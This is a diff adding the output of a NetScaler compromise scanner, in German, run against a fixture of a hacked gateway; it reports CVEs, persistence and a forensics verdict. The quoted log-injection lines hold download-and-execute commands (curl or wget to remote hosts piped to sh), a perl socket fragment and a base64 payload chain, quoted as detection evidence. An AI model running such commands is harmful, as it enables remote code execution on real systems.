@@ -1,0 +1,99 @@
+ns_quickcheck V  host=gw-01  modus=offline  fenster=1000000h  regeln=2026-10-28e  cli=none  TS
+Quelle: REPO/docs/testdata/fixtures/compromised
+Whitelist: nicht vorhanden (REPO/ns_quickcheck.whitelist); alle Befunde ungefiltert
+
+== 1 Build ==
+  [ROT]   Build 14.1-73.41 ist VERWUNDBAR gegen CVE-2026-107406 (CTX697191), Fix ab 14.1-73.46: SAML-IdP Memory Overflow RCE/DoS CVSS 9.5, kein Workaround, IdP-Rolle erst ab 73.46 gefixt (Bedingung: ^add authentication samlIdPProfile  konfiguriert)
+  [ROT]   Build 14.1-73.41 ist VERWUNDBAR gegen CVE-2026-109618 (CTX697263), Fix ab 14.1-73.49: PHP2Shell: Speicherkorruption beim Out-of-Memory-Handling, RCE im Management-Portal, CVSS 4.0 9.2
+  [ROT]   Build 14.1-73.41 ist VERWUNDBAR gegen CVE-2026-109619 (CTX697263), Fix ab 14.1-73.49: PHP2Shell: wiederverwendeter Request-Zustand nach Freigabe, RCE im Management-Portal, CVSS 4.0 9.2
+  [INFO]  Ziel-Build fuer diesen Train: 14.1-73.49
+  [INFO]  Letzter Boot: 2026-10-06 12:55 (N Tage)
+
+== 2 Exposure ==
+  [INFO]  SAML konfiguriert (SP=0 IdP=1) - SAML-abhaengige CVE offen, siehe Block 1
+  [INFO]  DTLS an 1 Gateway-vServer aktiv (CVE-2026-88772-Voraussetzung; auf gefixtem Build mitigiert)
+  [GELB]  Konfigurationsschritt fehlt: set ns tcpParam -enhancedISNGeneration ENABLED (CVE-2026-88778, CTX697096) - bleibt auch nach Upgrade offen
+  [GELB]  Management-Zugriff auf SNIP aktiv: 192.0.2.10 - NITRO/GUI erreichbar; CVE-2026-88771 wird auch ueber fehlgeschlagene NITRO-Logins gestaged
+  [GELB]  Management-Portal (PHP, CTX697263) auf verwundbarem Build ohne ACL-Schutz: 192.0.2.10 - bis zum Update Port 80/443 dieser Adressen per ACL auf Admin-Netze begrenzen (Citrix-Empfehlung)
+
+== 3 Mitigation ==
+  [GELB]  Keine Responder-/Traffic-Policy mit Log-Poisoning- oder SAML-Mustern - auf ungefixtem Build fehlt jede Mitigation
+
+== 4 Angriffsspuren (letzte 1000000h) ==
+  [INFO]  nsprofmon_mgmt.pl-Zeilen (CPU-Momentaufnahmen mit Prozess-Kommandozeilen) vorab abgezweigt: 1; sie werden nur noch auf verdaechtige Prozesse geprueft, damit der Quickcheck sich nicht selbst findet
+  [INFO]  Gelesene Logs im Fenster: ns.log/nsvpn/messages/notice 1, httpaccess 1, httperror 0, auth.log 0, httpaccess.log (Management) 1, cron 0 Datei(en)
+  [ROT]   7 Logon-Zeile(n) mit Injection-Mustern (CVE-2026-88771 / Log-Poisoning), Oct 5 03:12:44 bis Oct 5 03:13:02:
+          | Oct  5 03:12:44 _local0.info_ 198.51.100.7 10/05/2026:03:12:44 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1201 0 :  Request from client 198.51.100.7 for user "pitboss unexpectedly died_ curl_{IFS}-sSLk_{IFS}hxxps://v5v.in/r.sh?k=TESTKEY_sh" vserver gw-vs
+          | Oct  5 03:12:44 _local0.info_ 198.51.100.7 10/05/2026:03:12:44 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1202 0 :  Request from client 198.51.100.7 for user "missed too many heartbeats_ wget -q hxxp://143.198.7.94/x.sh -O /var/tmp/x.sh_ sh /var/tmp/x.sh" vserver gw-vs
+          | Oct  5 03:12:45 _local0.info_ 198.51.100.7 10/05/2026:03:12:45 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1203 0 :  Request from client 198.51.100.7 for user "NSPPE-0 _ perl -e 'use Socket_' _ echo pylrk.cc" vserver gw-vs
+          | Oct  5 03:12:46 _local0.info_ 198.51.100.7 10/05/2026:03:12:46 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1204 0 :  Request from client 198.51.100.7 for user "user01%3Bcurl%20http%3A%2F%2Fgs.thc.org%2Fx%7Csh" vserver gw-vs
+          | Oct  5 03:12:47 _local0.notice_ 198.51.100.7 10/05/2026:03:12:47 GMT gw-01 0-PPE-0 : default AAA Message 1205 0 :  "authenticate user: failed for user pitboss unexpectedly died_ curl_{IFS}-sSLk_{IFS}hxxps://v5v.in/r.sh?k=TESTKEY_sh"
+          | Oct  5 03:13:01 _local0.info_ 198.51.100.7 10/05/2026:03:13:01 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1206 0 :  Request from client 198.51.100.7 for user "pitboss PPE missed too many heartbeats NSPPE-0 _ grep_{IFS}INDEX:_{IFS}/var/log/httpaccess.log_sed_{IFS}s/.*INDEX://_b64decode_{IFS}-r_sh" vserver gw-vs
+          | Oct  5 03:13:02 _local0.info_ 198.51.100.7 10/05/2026:03:13:02 GMT gw-01 0-PPE-0 : default AAA LOGIN REQ 1207 0 :  Request from client 198.51.100.7 for user "user05" User-Agent "INDEX:ZWNobyBoZWxsbyB8IGI2NGRlY29kZSAtcg== _b64decode -r_sh"
+          | Wann:          Oct 5 03:12:44 bis Oct 5 03:13:02, 7 Zeile(n) auf 1 Packet Engine(s)
+          | Log:           REPO/docs/testdata/fixtures/compromised/var/log/ns.log (7)
+          | Ergebnis:      Build 14.1-73.41 ist verwundbar; diese Zeilen koennen vom taeglichen ns_monuploadd_err.pl ausgefuehrt worden sein oder noch werden.
+          | Download-Host: 143.198.7.94   Sperrliste: nein   Regeldatei: ja (cisa-261399-r1 2026-10-07)   Adressliste: payload_download_host
+          | Download-Host: v5v.in   Sperrliste: nein   Regeldatei: nein   Adressliste: payload_download_host
+          | Quelle:        198.51.100.7, passt zu 2 von 6 Versuchszeit(en) (bei NAT nur die NAT-Adresse)
+          | Zu tun:        1. Nicht patchen, nicht neu starten; Logs und /var/core extern sichern (Runbook).
+          |                2. Block 5 lesen: Payload-Dateien, Webshells, Konten; bei Treffer Incident-Prozess.
+  [OK]    Keine Abstuerze im Fenster (Pitboss, Kernel, Apache-Fehlerlog, /var/core)
+  [INFO]  3 nsaaad-Zeile(n) in einem Format, das die verankerten Muster nicht kennen (Build 14.1-73.41); bitte anonymisiert einsenden, damit das Muster ergaenzt wird
+  [OK]    Keine verdaechtigen Prozesse in den CPU-Momentaufnahmen
+  [ROT]   Requests auf Dropper-Transportpfade (nsgclient-Pakete): Dropper-Suche oder Quell-IP mit Injection-Zeile, kein Client:
+          | Wann:          05/Oct/2026:03:14:10 bis 05/Oct/2026:03:14:11
+          | Log:           REPO/docs/testdata/fixtures/compromised/var/log/httpaccess.log (2)
+          | Adresse:       198.51.100.7   2 Request(s)   Dropper-Suche: nein   Sperrliste: nein   Regeldatei: nein   Adressliste: dropper_requester
+          | Ergebnis:      offen; echte Linux-Clients fragen nsgclient.deb ab, Angreifer holen nsg64.deb und aehnliche Pakete. Die Pfade unten entscheiden.
+          | Zu tun:        1. Pfade unten je Adresse pruefen: nsgclient.deb von bekannten Clients = normal, andere Paketnamen = sperren und melden.
+          |                2. Pfade je Adresse:
+          | 198.51.100.7  /vpn/scripts/linux/nsgclient18_32.deb  (1x)
+          | 198.51.100.7  /vpn/scripts/linux/nsgclient18.deb  (1x)
+  [INFO]  Webserver-Fehlerlog nicht geprueft: keine httperror*-Datei im Fenster (1000000h)
+  [OK]    Management-Ebene (NITRO, GUI) nur von internen Adressen angesprochen
+  [INFO]  Anmeldungen nicht geprueft: keine auth.log-Datei im Fenster (1000000h)
+  [OK]    Keine Gateway-Anmeldefehler im Fenster
+
+== 5 Kompromittierungs-Schnellcheck ==
+  [ROT]   Bekannter Payload-Pfad existiert: /netscaler/ns_gui/vpn/c88771.json (2026-10-14 09:00) - Quelle: sygnia 2026-10-01
+  [OK]    Keine Web-Dateien seit Boot geaendert
+  [GELB]  Root-Crontab-Zeilen ausserhalb der erlaubten Liste:
+          | */5 * * * * /var/tmp/.nsmon _/dev/null 2__1
+  [ROT]   Crontab fuer Benutzer nobody vorhanden (1 Zeilen) - bekannte Persistenz
+  [ROT]   Listener von Interpreter/Shell-Prozessen auf erreichbaren Adressen:
+          | perl nobody *:4444
+  [INFO]  Monitor-Script laeuft unter dem Stock-Daemon (PID 4411, Parent: /netscaler/monuploadd monuploadd -P ) - regulaerer Mechanismus
+  [ROT]   Kindprozess des Monitor-Scripts (PID 4411) ist Shell oder Downloader - Ausfuehrung einer Log-Injection:
+          | sh -c curl -sSLk hxxps://v5v.in/r.sh_sh 
+  [GELB]  Prozess trifft SUSPECT_PROC_RE unter cron (PID 4410, PPID 812) - nicht der Stock-Mechanismus (Daemon monuploadd), einordnen:
+          |  4410   812 root     Mon Oct 12 04:10:00 2026     /usr/bin/perl /netscaler/ns_monuploadd_err.pl -WR
+  [ROT]   Prozess trifft SUSPECT_PROC_RE ausserhalb des Stock-Daemons (PID 5120, Parent: /sbin/init ) - manueller Start des Monitor-Scripts (CISA SIGMA S7):
+          |  5120     1 nobody   Mon Oct 12 05:22:13 2026     /usr/bin/perl /netscaler/ns_monuploadd_err.pl -WR
+  [ROT]   Kindprozess des Monitor-Scripts (PID 5120) ist Shell oder Downloader - Ausfuehrung einer Log-Injection:
+          | sh -c id 
+  [ROT]   Aktive Verbindung zu einem Payload-Host oder bekannter Angreifer-Adresse:
+          | nobody perl 5131 5 tcp4 192.0.2.20:51000 143.198.7.94:443
+  [GELB]  Lokale System-User neben nsroot: sec_monitor - jeden bestaetigen (Angreifer legen eigene an, z. B. sec_monitor)
+  [ROT]   System-User sec_monitor = bekannte Backdoor (LevelBlue)
+  [ROT]   2 gespeicherte Config-Aenderung(en) an User, Auth, EPA oder Management zwischen 2026-10-28 05:35 und 2026-10-28 05:35 - jede bestaetigen:
+          | [neu] add ns ip 192.0.2.10 255.255.255.0 -type SNIP -mgmtAccess ENABLED
+          | [neu] add system user sec_monitor
+
+== 6 Verdict ==
+ACTION: FORENSICS_FIRST
+Kompromittierungszeichen gefunden. Nicht rebooten, nicht upgraden, bevor gesichert ist:
+  1. Appliance isolieren (Failover auf gepatchten Knoten oder Firewall), HA-File-Sync pruefen, Peer ebenfalls pruefen.
+  2. Sichern: show techsupport, /var/log, /var/core, die genannten Dateien, RAM wenn moeglich (CTX694799).
+  3. Citrix Support einbinden, offiziellen IoC-Scan anfordern. Danach Rebuild, alle Secrets inkl. KEK rotieren, Zertifikate widerrufen.
+
+Adressen dieses Laufs, aufgenommen in ns_quickcheck_observed_ips.tsv:
+  143.198.7.94       outbound_hit           neu                              Sperrliste: nein
+  143.198.7.94       payload_download_host  neu                              Sperrliste: nein
+  198.51.100.7       dropper_requester      neu                              Sperrliste: nein
+  198.51.100.7       injection_source       neu                              Sperrliste: nein
+  4 Eintrag/Eintraege; reine Liste ohne vertraute Adressen: grep -v '^#' ns_quickcheck_observed_ips.tsv | grep -v '^trusted_' | cut -f2 | sort -u
+
+
+Erstellt mit netscaler-quickcheck V (Regelstand 2026-10-28e), Apache 2.0, ceterion AG: ceterion.com/netscaler-quickcheck
+RESULT host=gw-01 build=14.1-73.41 mode=offline cli=none window=1000000h saml=1 vuln96=0 vuln_open=3 vuln63=1 vuln79=1 isn_open=1 traces=1 mitigation=0 unsaved=0 save_missing=0 compromise=1 red=14 yellow=7 orange=0 blocked_seen=0 trusted_seen=0 crashes=0 lang=de coverage=full action=FORENSICS_FIRST rules=2026-10-28e script_sha256=X rules_sha256=b8ea6f58168ed41f00829c527790aa22ae5358ccded5ffdfd8dc06542a8c5e4d msg_sha256=X custom=none custom_sha256=none cve_custom=0 cve_conflict=0 runtime=Ns
